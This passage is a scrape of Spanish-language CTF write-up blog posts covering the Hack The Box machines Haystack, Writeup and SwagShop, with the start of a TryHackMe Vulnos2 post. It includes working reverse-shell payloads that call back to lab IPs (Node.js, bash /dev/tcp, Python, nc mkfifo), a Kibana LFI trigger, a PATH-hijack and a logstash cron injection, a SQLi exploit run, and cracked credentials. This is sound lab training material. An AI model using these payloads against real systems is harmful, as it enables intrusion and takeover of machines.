as: nmap -sV -sC -p 9200,22,80 -o nmap.scan -e tun1 10.10.10.115 Nmap scan report for 10.10.10.115 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 29 21:51:09 2019 -- 1 IP address (1 host up) scanned in 42.27 seconds HTTP GOBUSTER Realizamos una busqueda de directorios y archivos en el puerto 80 http con gobuster.\n1 2 3 root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115/ -w /usr/share/wordlists/dirb/common.txt -np -x php,txt,html -t 15 -q /index.html (Status: 200) /index.html (Status: 200) Hint - Imagen Dentro de la imagen que se encuentra en el index del puerto 80 encontramos una cadena en base64 con lo que parece un hint.\nImagen:\nHint:\nGOBUSTER - Puerto 9200 Realizamos una busqueda de directorios y archivos en el puerto 9200 con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirb/common.txt -np -x txt,html -t 15 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.115:9200/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : txt,html [+] Timeout : 10s ===================================================== 2019/06/29 19:25:40 Starting gobuster ===================================================== /_stats (Status: 200) /_template (Status: 200) /bank (Status: 200) /favicon.ico (Status: 200) /quotes (Status: 200) ===================================================== 2019/06/29 19:27:49 Finished ===================================================== Encontramos algunos directorios no muy comunes, al visitar este puerto con firefox encontramos que esta corriendo un servidor de Elasticsearch en su version 6.4.2.\nAl hacer una pequeña enumeracion encontramos 3 aliases, los cuales podemos utilizar para obtener informacion que esta almacenado en el servidor.\nEn el alias de .kibana encontramos una vulnerabilidad de LFI pero esta no afecta a este alias del servidor.\nPara obtener informacion de uno de los aliases (index) vamos a utilizar el siguiente query:\nElasticsearch Query - 1 Elasticsearch Query - 2 1 2 3 4 5 6 7 8 9 curl -s -X GET \u0026#34;http://10.10.10.115:9200/bank/_search\u0026#34; -H \u0026#39;Content-Type: application/json\u0026#39; -d\u0026#39; { \u0026#34;size\u0026#34;: 5, \u0026#34;query\u0026#34;: { \u0026#34;match_all\u0026#34;: {} } } \u0026#39; El resultado del query son 5 valores que se encuentran dentro de \u0026lsquo;bank\u0026rsquo;, podemos hacer lo mismo para los demas aliases que encontramos.\nEn este caso vamos a buscar dentro del alias \u0026lsquo;quotes\u0026rsquo;, como anteriormente obtuvimos un \u0026lsquo;hint\u0026rsquo; en la imagen del index vamos a buscar en este caso la palabra \u0026ldquo;clave\u0026rdquo; dentro de este alias.\n1 curl -s -X GET http://10.10.10.115:9200/quotes/_search?q=clave | jq . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026#34;hits\u0026#34;: { \u0026#34;total\u0026#34;: 2, \u0026#34;max_score\u0026#34;: 5.9335938, \u0026#34;hits\u0026#34;: [ { \u0026#34;_index\u0026#34;: \u0026#34;quotes\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;quote\u0026#34;, \u0026#34;_id\u0026#34;: \u0026#34;45\u0026#34;, \u0026#34;_score\u0026#34;: 5.9335938, \u0026#34;_source\u0026#34;: { \u0026#34;quote\u0026#34;: \u0026#34;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg \u0026#34; } }, { \u0026#34;_index\u0026#34;: \u0026#34;quotes\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;quote\u0026#34;, \u0026#34;_id\u0026#34;: \u0026#34;111\u0026#34;, \u0026#34;_score\u0026#34;: 5.3459888, \u0026#34;_source\u0026#34;: { \u0026#34;quote\u0026#34;: \u0026#34;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=\u0026#34; } } ] } Obtenemos dos resultados, los cuales nso muestran dos mensajes con una cadena en base64, al decodificarlos obtenemos credenciales.\n1 2 user: security pass: spanish.is.key SSH - User flag Ya que obtuvimos nuestras credenciales nos logeamos atravez del servicio ssh, obtenemos una shell y nuestra flag user.txt.\nKibana 6.4.2 Como vimos anteriormente encontramos un alias .kibana el cual no era afectado en el puerto 9200, al obtener una shell pudimos hacer una enumeracion y encontrar el archivo de configuracion en este caso kibana.yml el cual se encuentra en la carpeta /etc/kibana/.\nVemos que la configuracion de este archivo tiene otro puerto en el cual esta corriendo el \u0026lsquo;backend\u0026rsquo; de la aplicacion, pero este solo esta disponible en la maquina de manera local.\nPara poder ver lo que hay en el puerto 5601 vamos a hacer port forwarding, para traerlo localmente a nuestra maquina. Para ello utilizamos el siguiente comando:\n1 ssh -L 5601:localhost:5601 security@10.10.10.115 Verificamos con netstat que el puerto este activo en nuestra maquina:\nVisitamos el puerto de manera local y nos muestra una plataforma, en este caso la de Kibana.\nLFI - Kibana 6.4.2 Como lo dije anteriormente la version de Kibana 6.4.2 tiene una vulnerabilidad la cual permite ejecutar codigo mediante archivo javascript u obtener archivos mediante LFI, al explotar esta vulnerabilidad de LFI esta solo se ve reflejada dentro del archivo \u0026rsquo;log\u0026rsquo; de Kibana.\nExecute This\nCVE-2018-17246\nYouTube Kibana\nReverse Shell NodeJS\nUna cosa importante que debemos saber es de que, los archivos que se reflejan dentro del log son archivos a los que Kibana tiene acceso. Para obtener una shell tenemos que escribir un archivo javascript dentro de la maquina en un lugar donde el usuario Kibana tenga acceso, el codigo de la Shell Inversa es:\n1 2 3 4 5 6 7 8 9 10 11 12 (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(1337, \u0026#34;10.10.14.85\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); Escribimos nuestra shell en /tmp/ y le dimos permisos para todos los usuarios:\nPara poder ejecutar nuestra shell inversa podemos hacer una solicitud con curl o hacerlo con firefox:\n1 curl \u0026#34;http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\u0026amp;apis=../../../../../../.../../../../tmp/shell.js\u0026#34; -vv Por otro lado obtuvimos nuestra shell inversa como usuario Kibana:\nPRIVILEGE ESCALATION Para obtener una shell como usuario root primero enumeramos los crons que se ejecutan con el usuario root esto lo hacemos con pspy. Al realizar esto encontramos un proceso que se ejecuta cada minuto aproximadamente. Este proceso esta relacionado con logstash la cual es una herramienta que administra los logs.\nAl realizar una enumearcion de esta herramienta encontramos dentro de /etc/logstash los archivos de configuracion de esta herramienta. Dentro de la carpeta /etc/logstash/conf.d encontramos 3 archivos los cuales se utilizan para administrar logs.\nEl primer archivo (filter.conf) contiene una expresion regular la cual es utlizada para organizar los archivos log. En el segundo archivo (input.conf) encontramos que apunta a un archivo path =\u0026gt; /opt/kibana/logstash_* el cual va ser ejecutado por el programa con cierto intervalo de tiempo. En el tercer archivo (output.conf) este ultimo ejecuta el archivo o el codigo que se encuentra en el archivo (path) input.conf.\nfilter.conf:\n1 2 3 4 5 6 7 filter { if [type] == \u0026#34;execute\u0026#34; { grok { match =\u0026gt; { \u0026#34;message\u0026#34; =\u0026gt; \u0026#34;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\u0026#34; } } } } input.conf:\n1 2 3 4 5 6 7 8 9 10 input { file { path =\u0026gt; \u0026#34;/opt/kibana/logstash_*\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; sincedb_path =\u0026gt; \u0026#34;/dev/null\u0026#34; stat_interval =\u0026gt; \u0026#34;10 second\u0026#34; type =\u0026gt; \u0026#34;execute\u0026#34; mode =\u0026gt; \u0026#34;read\u0026#34; } } output.conf:\noutput {\rif [type] == \u0026#34;execute\u0026#34; {\rstdout { codec =\u0026gt; json }\rexec {\rcommand =\u0026gt; \u0026#34;%{comando} \u0026amp;\u0026#34;\r}\r}\r} Execute Cmd on Elasticsearch\nYa que este programa es ejecutado por el usuario root cada cierto tiempo, podemos escribir como usuario Kibana en el directorio /opt/kibana/ un archivo de shell inversa, pero este archivo debe de hacer match con la expresion regular que se encuentra en el archivo filter.conf: ('match =\u0026gt; { \u0026quot;message\u0026quot; =\u0026gt; \u0026quot;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\u0026quot; }').\nPara poder entender un poco mas las expresiones regulares de esta herramienta podemos verlo aqui:\nGrok Custom Patterns GrokPatterns El codigo que debemos de agregar al archivo es:\n1 Ejecutar comando : /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.85/1598 0\u0026gt;\u0026amp;1 Para agregar el codigo a nuestro archivo utilizamos el siguiente comando:\n1 echo \u0026#34;Ejecutar comando : /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.85/1598 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; /opt/kibana/logstash_bash El nombre de nuestro archivo debe de llevar en su nombre logstash_ (input.conf) para que pueda ser ejecutado en nuestro caso /opt/kibana/logstash_bash. Un problema que tiene esta herramienta es la ejecucion, especificamente por el nombre ya que por alguna razon utilizar el mismo nombre de archivo genera algun problema y no se ejecuta, por lo que al agregar o cambiar el comando que se desea ejecutar se debe de crear un nuevo archivo con diferente nombre.\nPor otro lado ponemos a la escucha netcat con el puerto que le pasamos a nuestra shell inversa, esperamos un poco a que se ejecute el cron de nuevo y obtenemos una shell como usuario root y nuestra flag root.txt.\nCodigo de nuestra shelll inversa se ejecuta:\nShell - ROOT ","description":"Enumeramos Elasticsearch en donde encontramos credenciales para obtener acceso por SSH. Encontramos Kibana el cual obtuvimos localmente con SSH que ademas explotamos una vulnerabilidad la cual nos dio acceso al siguiente usuario. Un CronJob con Logstash nos dio una shell como usuario root.","id":184,"section":"posts","tags":["elasticsearch","kibana 6.4.2","steganography","cron","logstash"],"title":"Hack The Box - Haystack","uri":"https://sckull.github.io/posts/haystack/"},{"content":"\rWriteup es una maquina de HackTheBox. Encontramos una vulnerabilidad de SQL Injection en CMS Made Simple donde encontramos credenciales para acceder por SSH. Modificamos un script utilizado por un CronJob para escalar privilegios.\nInformacion de la Maquina Nombre Writeup OS Linux Puntos 20 Dificultad Facil IP 10.10.10.138 Maker jkr\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.9, 6.9, 7.3, 2.7, 3.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[5, 6, 8, 2, 4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos TCP/UDP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@sckull:~/htb/writeup# masscan -p1-65535,U:1-65535 10.10.10.138 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-14 23:30:31 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.138 Discovered open port 22/tcp on 10.10.10.138 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 17:38 CST Nmap scan report for 10.10.10.138 Host is up (0.24s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA) | 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA) |_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds HTTP - Puerto 80 Al visitar el puerto 80 en http nos muestra una pagina con un mensaje en el cual nos indica que la pagina tiene un script anti ddos.\nRobots.txt Intentamos utilizar gobuster, dirb y wfuzz para busqueda de directorios y archivos pero por el script que nos indica en la pagina principal no pudimos realizar dicha busqueda por lo que visitamos el archivo robots.txt de la pagina principal y nos muestra que esta \u0026ldquo;oculto\u0026rdquo; /writeup/, al visitar esta pagina nos muestra una serie de writeups de maquinas que ya fueron retiradas de hackthebox.\nCMS Made Simple Utilizamos la extension para firefox Wappalyzer la cual nos ayuda a identificar el tipo de CMS, Web Server, Programming Language y Operating Ssytem de una pagina web. Al utilizar esta extension en la pagina nos muestra lo mencionado anteriormente.\nSabiendo esto buscamos exploits que puedan afectar a este CMS con Searchsploit.\nEncontramos varios exploits que afectan a este CMS cada uno de ellos en distintas versiones y tipos de vulnerabilidad, para esta version utilizamos CMS Made Simple \u0026lt; 2.2.10 - SQL Injection (CVE-2019-9053).\nCMS Made Simple - SQLI Utilizamos el exploit contra la pagina y nos muestra las credenciales del usuario jkr el salto de la contraseña y la contraseña.\n1 2 3 4 5 root@sckull:~/htb/writeup# python CVE-2019-9053.py -u http://10.10.10.138/writeup/ [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 Hashcat Para obtener la contraseña en texto plano utilizamos Hashcat, escribimos el hash y el salto de la contraseña en un archivo para utilizarlo con hashcat y un diccionario.\nContraseña:salto\n62def4866937f08cc13bab43bb14e6f7:5a599ef579066807\nComando hashcat:\n1 ./hashcat64.bin -m 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 ../rockyou.txt -o huehue.txt Contraseña crackeada:\n62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9\nSSH - User Cuando obtuvimos nuestra usuario y contraseña con el exploit la probamos en el panel de administracion del CMS que esta corriendo en el puerto 80 pero no tuvimos suerte de acceder por ese lado, por lo que utilizamos las credenciales en el servicio SSH y nos logeamos satisfactoriamente.\nFlag user.txt:\nPRIVILEGE ESCALATION Utilizamos pspy para observar los procesos que se ejecutan, encontramos que un proceso se ejecuta a cada vez que se inicia sesion en el servicio de SSH.\nVemos que este proceso env donde se le pasa la variable $PATH del usuario root, luego de eso ejecuta un comando:\n1 run-parts --lsbsysinit /etc/update-motd.d \u0026gt; /run/motd.dynamic.new Buscamos en que carpeta se encuentra run-parts:\nRevisamos la variable PATH del usuario root y las carpetas donde tenemos permisos de escritura:\n1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Carpetas donde tenemos permisos de escritura:\nfind / -writable -type d 2\u0026gt;/dev/null Encontramos una carpeta que el usuario root utiliza en su variable PATH (/usr/local/sbin/), esta direccion es la primera que se utiliza para poder \u0026ldquo;encontrar\u0026rdquo; los programas/scripts/etc que se escriban en la terminal de comandos, en este caso la primera direccion donde el usuario root va a buscar run-parts es /usr/local/sbin/.\nSabiendo esto, podemos escribir un comando/reverse shell dentro de /usr/local/sbin/run-parts el cual va ser ejecutado por el usuario root. Vamos hacer una prueba con un ping hacia nuestra maquina:\necho \u0026#34;/bin/ping -c 2 10.10.15.122\u0026#34; \u0026gt; /usr/local/sbin/run-parts \u0026amp;\u0026amp; chmod +x /usr/local/sbin/run-parts La respuesta la vemos reflejada con tcpdump:\nAhora que tuvimos una respuesta de la maquina vamos a agregar nuestra shell inversa al archivo y vamos a poner a la escucha netcat localmente:\n1 echo \u0026#34; python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.10.15.122\\\u0026#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39; \u0026#34; \u0026gt; /usr/local/sbin/run-parts \u0026amp;\u0026amp; chmod +x /usr/local/sbin/run-parts Obtenemos nuestra shell inversa como usuario root y nuestra flag root.txt:\n","description":"Writeup es una maquina de HackTheBox. Encontramos una vulnerabilidad de SQL Injection en CMS Made Simple donde encontramos credenciales para acceder por SSH. Modificamos un script utilizado por un CronJob para escalar privilegios.","id":185,"section":"posts","tags":["CMS Made Simple","cron"],"title":"Hack The Box - Writeup","uri":"https://sckull.github.io/posts/writeup/"},{"content":"\rSwagShop es una maquina de HackTheBox vemos Magento con una vulnerabilidad que permite crear usuarios lo que nos permitio ejecutar una shell inversa explotando una segunda vulnerabilidad. Escalamos privilegios utilizando ejecutando una shell con Vi.\nInformacion de la Maquina Nombre SwagShop OS Linux Puntos 20 Dificultad Facil IP 10.10.10.140 Maker ch4p\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.6, 6.7, 7.8, 2.2, 3.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 7, 9, 1, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp.\n1 2 3 4 5 6 7 8 root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.140 Discovered open port 80/tcp on 10.10.10.140 EScaneo de puertos 22, 80.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.70 scan initiated Mon May 13 12:54:19 2019 as: nmap -sV -p22,80 -o nmap.scan 10.10.10.140 Nmap scan report for 10.10.10.140 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 13 12:54:27 2019 -- 1 IP address (1 host up) scanned in 8.08 seconds HTTP Visitamos la pagina principal y nos muestra una tienda con algunos productos.\nGOBUSTER Algunos directorios y paginas encontradas con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.140/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,txt,html [+] Timeout : 10s ===================================================== 2019/05/13 13:05:05 Starting gobuster ===================================================== /api.php (Status: 200) /app (Status: 301) /cron.php (Status: 200) /downloader (Status: 301) /errors (Status: 301) /favicon.ico (Status: 200) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /install.php (Status: 200) /js (Status: 301) /lib (Status: 301) /LICENSE.txt (Status: 200) /LICENSE.html (Status: 200) /media (Status: 301) /pkginfo (Status: 301) /server-status (Status: 403) /shell (Status: 301) /skin (Status: 301) /var (Status: 301) ===================================================== 2019/05/13 13:08:09 Finished ===================================================== Magento eCommerce - Exploit Al investigar un poco acerca de la plataforma nos encontramos un exploit el cual crea un usuario dentro de la base de datos con permisos de administracion, editamos un poco el exploit especificamente el usuario (username=\u0026quot;sckull\u0026quot;) y contraseña (password=\u0026quot;sckull\u0026quot;) para mostrar une explotacion exitosa tambien debemos de cambiar el target con el valor de target = \u0026quot;http://10.10.10.140/index.php\u0026quot;, mas informacion acerca de esta vulnerabilidad.\nCVE:2015-1397\nObtenemos acceso a la plataforma de Magento como administrador.\nAhora que tenemos acceso a la plataforma con nuestras credenciales podemos utilizar un segundo exploit el cual executa comandos en la maquina, para ello debemos de agregar usuario (username) y contraseña (password) que creamos con el anterior exploit de igual forma agregamos la fecha que se encuentra en /app/etc/local.xml.\nMagento CE \u0026lt; 1.9.0.1 Post Auth RCE\nExplotacion SHELL - www-data Ahora que podemos ejecutar comandos por medio de un exploit vamos a obtener una shell inversa.\nCMD:\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.15.31 9090 \u0026gt;/tmp/f Actualizamos nuestra shell a una mas estable con python.\nSHELL:\nDentro de la carpeta principal del usuario haris encontramos nuestra bandera user.txt.\nPrivilege Escalation Ahora que tenemos una shell con acceso de privilegio bajo hacemos una pequeña enumeracion de los programas que podamos, por medio del comando sudo ejecutar, encontramos que podemos ejecutar vi con privilegios de administracion.\nPara mostrar los comandos que podemos ejecutar con sudo utilizamos sudo -l.\nSudo - Privilege Escalation\nAbusing sudo\nUtilizamos vi para poder abrir una shell como root para ello vamos a utilizar un archivo que se encuentra en /var/www/html/ ya que es la direccion donde tiene permitido vi ejecutarse o editar archivos mediante sudo.\n1 sudo /usr/bin/vi /var/www/html/install.php Luego de que se habra el editor presionamos la tecla ESC y escribimos :shell y se abrira una shell como usario root.\nObtenemos nuestra bandera root.txt.\n","description":"SwagShop es una maquina de HackTheBox vemos Magento con una vulnerabilidad que permite crear usuarios lo que nos permitio ejecutar una shell inversa explotando una segunda vulnerabilidad. Escalamos privilegios utilizando ejecutando una shell con Vi.","id":186,"section":"posts","tags":["Magento eCommerce","vim"],"title":"Hack The Box - SwagShop","uri":"https://sckull.github.io/posts/swagshop/"},{"content":"\rVulnos2 es una maquina de TryHackMe, encontramos multiples vulnerabilidades en OpenDocMan las cuales explotamos para obtener credenciales y acceer al panel de Drupal, que luego nos permitio ejecutar una shell inversa. Ejecutamos un exploit que afecta al Kernel de Linux para escalar privilegios.\nRoom Titulo Vulnos2 Descripción Just a typical web server, nothing to be suspicious of here. Puntos * Dificultad Media Maker DarkStar7471 MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 root@kali:~/trymehack/vulnos2# masscan -p1-65535,U:1-65535 10.10.169.208 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-19 03:46:19 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.169.208 Discovered open port 80/tcp on 10.10.169.208 # Nmap 7.80 scan initiated Wed Sep 18 23:47:13 2019 as: nmap -sV -p- --min-rate 1000 -o nmap.scan 10.10.169.208 Warning: 10.10.169.208 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.169.208 Host is up (0.18s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 6667/tcp open irc ngircd 10337/tcp filtered unknown 12017/tcp filtered unknown 13034/tcp filtered unknown 13725/tcp filtered unknown 15125/tcp filtered unknown 27879/tcp filtered unknown 32710/tcp filtered unknown 33826/tcp filtered unknown 36395/tcp filtered unknown 36503/tcp filtered unknown 45704/tcp filtered unknown 46157/tcp filtered unknown 46605/tcp filtered unknown 49823/tcp filtered unknown 60384/tcp filtered unknown Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 18 23:49:32 2019 -- 1 IP address (1 host up) scanned in 139.20 seconds # Nmap 7.80 scan initiated Wed Sep 18 23:50:25 2019 as: nmap -sV -sC -p 22,80,6667 -o nmap_sv.scan 10.10.169.208 Nmap scan report for 10.10.169.208 Host is up (1.4s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA) | 2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA) | 256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA) |_ 256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: VulnOSv2 6667/tcp open irc ngircd Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 18 23:50:59 2019 -- 1 IP address (1 host up) scanned in 34.28 seconds WHATWEB HTTP Pagina en el puerto 80.\nDIRBUSTER Realizamos una busqueda de direcotrios, archivos html y txt con dirbuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 root@kali:~/trymehack/vulnos2# gobuster dir -u http://10.10.169.208/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.169.208/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2019/09/18 23:53:44 Starting gobuster =============================================================== /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) =============================================================== 2019/09/18 23:58:34 Finished =============================================================== HTTP - /jabc/ Encontramos dentro de la pagina principla un enlace que nos redirige hacia otra pagina.\nDentro de la pagina de Documentation a simple vista se ve que no 